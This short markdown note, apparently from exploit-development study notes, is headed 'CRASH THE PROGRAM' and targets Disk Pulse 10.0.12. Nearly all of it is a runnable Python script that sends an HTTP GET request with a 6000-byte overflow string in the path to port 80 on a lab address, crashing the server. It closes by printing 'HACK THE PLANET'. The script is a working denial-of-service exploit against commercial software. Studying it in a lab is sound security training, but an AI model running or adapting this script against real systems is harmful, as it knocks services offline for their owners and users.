
# DISK_PULSE_V10.0.12

## CRASH THE PROGRAM


```python
#!/usr/bin/python
import socket, sys

target = "192.168.123.10"
port = 80


def send_exploit_request():

    inputBuffer  = b"A" * 6000

    print(f"[+] Sending {len(inputBuffer)} bytes.....")


    #HTTP Request
    request = b"GET /" + inputBuffer + b"HTTP/1.1" + b"\r\n"
    request += b"Host: " + target.encode() + b"\r\n"
    request += b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0" + b"\r\n"
    request += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + b"\r\n"
    request += b"Accept-Language: en-US,en;q=0.5" + b"\r\n"
    request += b"Accept-Encoding: gzip, deflate" + b"\r\n"
    request += b"Connection: keep-alive" + b"\r\n\r\n"
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.send(request)
    s.close()
    
    print("HACK THE PLANET")

if __name__ == "__main__": 
    send_exploit_request()
```